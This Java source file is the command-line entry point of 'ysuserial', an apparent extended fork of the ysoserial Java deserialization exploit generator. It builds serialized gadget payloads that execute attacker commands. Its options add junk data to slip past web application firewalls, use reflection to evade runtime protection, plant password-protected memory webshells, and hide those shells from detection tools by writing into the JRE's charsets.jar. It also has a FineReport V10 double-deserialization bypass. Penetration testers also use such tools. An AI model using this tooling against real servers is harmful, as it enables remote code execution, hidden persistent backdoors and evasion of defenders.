package org.su18.ysuserial;

import java.io.*;
import java.util.*;

import org.apache.commons.cli.*;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.ObjectPayload.Utils;

import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;

import static org.su18.ysuserial.payloads.config.Config.*;
import static org.su18.ysuserial.payloads.util.HexUtils.generatePassword;

public class GeneratePayload {

	public static CommandLine cmdLine;


	private static final int INTERNAL_ERROR_CODE = 70;

	private static final int USAGE_CODE = 64;

	public static void main(final String[] args) {

		Options options = new Options();
		options.addOption("g", "gadget", true, "Java deserialization gadget");
		options.addOption("p", "parameters", true, "Gadget parameters");
		options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
		options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
		options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
		options.addOption("pw", "password", true, "MemoryShell password,default [p@ssw0rd]");
		options.addOption("r", "referer", true, "MemoryShell Referer check,default [https://su18.org/]");
		options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
		options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools by writing file to $JAVA_HOME,only support SpringControllerMS currently");
		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
		options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
		options.addOption("et", "encrypted-transcoder", false, "Encode By EncryptedTranscoder");
		options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
		options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
		options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
		options.addOption("fr", "fine-report", false, "FineReport V10 Double-Deserialization Bypass");

		CommandLineParser parser = new DefaultParser();

		if (args.length == 0) {
			printUsage(options);
			System.exit(USAGE_CODE);
		}

		try {
			cmdLine = parser.parse(options, args);
		} catch (Exception e) {
			System.out.println("[*] Parameter input error, please use -h for more information");
			printUsage(options);
			System.exit(USAGE_CODE);
		}

		if (cmdLine.hasOption("inherit")) {
			IS_INHERIT_ABSTRACT_TRANSLET = true;
		}

		if (cmdLine.hasOption("obscure")) {
			IS_OBSCURE = true;
		}

		if (cmdLine.hasOption("jboss")) {
			IS_JBOSS_OBJECT_INPUT_STREAM = true;
		}

		if (cmdLine.hasOption("encrypted-transcoder")) {
			IS_ENCRYPTED_TRANSCODER = true;
		}

		if (cmdLine.hasOption("url")) {
			String url = cmdLine.getOptionValue("url");
			if (!url.startsWith("/")) {
				url = "/" + url;
			}
			URL_PATTERN = url;
		}

		if (cmdLine.hasOption("define-class-from-parameter")) {
			PARAMETER = cmdLine.getOptionValue("define-class-from-parameter");
		}

		if (cmdLine.hasOption("file")) {
			WRITE_FILE = true;
			FILE = cmdLine.getOptionValue("file");
		}

		if (cmdLine.hasOption("password")) {
			PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
		}

		if (cmdLine.hasOption("referer")) {
			REFERER = cmdLine.getOptionValue("referer");
		}

		if (cmdLine.hasOption("no-com-sun")) {
			FORCE_USING_ORG_APACHE_TEMPLATESIMPL = true;
		}

		if (cmdLine.hasOption("mozilla-class-loader")) {
			USING_MOZILLA_DEFININGCLASSLOADER = true;
		}

		if (cmdLine.hasOption("fine-report")) {
			FINE_REPORT_BYPASS = true;
		}

		if (cmdLine.hasOption("gen-mem-shell")) {
			GEN_MEM_SHELL = true;

			if (cmdLine.hasOption("gen-mem-shell-name")) {
				GEN_MEM_SHELL_FILENAME = cmdLine.getOptionValue("gen-mem-shell-name");
			}
		}

		if (cmdLine.hasOption("hide-mem-shell")) {
			HIDE_MEMORY_SHELL = true;

			if (cmdLine.hasOption("hide-type")) {
				HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
			}
		}

		final String payloadType = cmdLine.getOptionValue("gadget");
		final String command     = cmdLine.getOptionValue("parameters");

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage(options);
			System.exit(USAGE_CODE);
			return;
		}


		try {
			ObjectPayload payload = payloadClass.newInstance();
			Object        object  = payload.getObject(command);

			// 是否指定混淆，
			if (cmdLine.hasOption("dirty-type") && cmdLine.hasOption("dirty-length")) {
				int type   = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
				int length = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
				object = new DirtyDataWrapper(object, type, length).doWrap();
			}

			OutputStream out;

			if (WRITE_FILE) {
				out = new FileOutputStream(FILE);
			} else {
				out = System.out;
			}

			// FineReport InvocationPack 二次反序列化 Bypass
			if (FINE_REPORT_BYPASS) {
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				Serializer.serialize(object, baos);
				byte[]   array  = baos.toByteArray();
				Class    c      = Class.forName("com.fr.rpc.serialization.InvocationSerializer$InvocationPack");
				byte[][] params = new byte[][]{array};
				Object   o      = Reflections.createInstanceUnsafely(c);
				Reflections.setFieldValue(o, "params", params);
				object = o;
			}

			Serializer.serialize(object, out);
			ObjectPayload.Utils.releasePayload(payload, object);

			out.flush();
			out.close();
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage(Options options) {

		System.err.println("            _.-^^---....,,--\n" +
				"       _--                  --_\n" +
				"      <                        >)\n" +
				"      |       Y Su Serial ?     |\n" +
				"       \\._                   _./\n" +
				"          ```--. . , ; .--'''\n" +
				"                | |   |\n" +
				"             .-=||  | |=-.\n" +
				"             `-=#$%&%$#=-'\n" +
				"                | ;  :|\n" +
				"       _____.,-#%&$@%#&#~,._____\n" +
				"     _____.,[ 暖风熏得游人醉 ],._____\n" +
				"     _____.,[ 直把杭州作汴州 ],._____"
		);
		System.err.println("[root]#~  A Mind-Blowing Tool Collected By [ su18@javaweb.org ]");
		System.err.println("[root]#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei");
		System.err.println("[root]#~  AND OF COURSE TO THE All MIGHTY @frohoff  ");
		System.err.println("[root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' [options]");
		System.err.println("[root]#~  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
				new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

		final List<String[]> rows = new LinkedList<String[]>();
		rows.add(new String[]{"Payload", "Authors", "Dependencies"});
		rows.add(new String[]{"-------", "-------", "------------"});
		for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
			rows.add(new String[]{
					payloadClass.getSimpleName(),
					Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
					Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
			});
		}

		final List<String> lines = Strings.formatTable(rows);

		for (String line : lines) {
			System.err.println("     " + line);
		}

		System.err.println("\r\n");
		new HelpFormatter().printHelp("ysoserial-[version]-su18-all.jar", options, true);
		System.err.println("\r\n");
		System.err.println("Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i");
		System.err.println("If you want your payload being extremely short，you could just use:");
		System.err.println("java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'");

	}
}
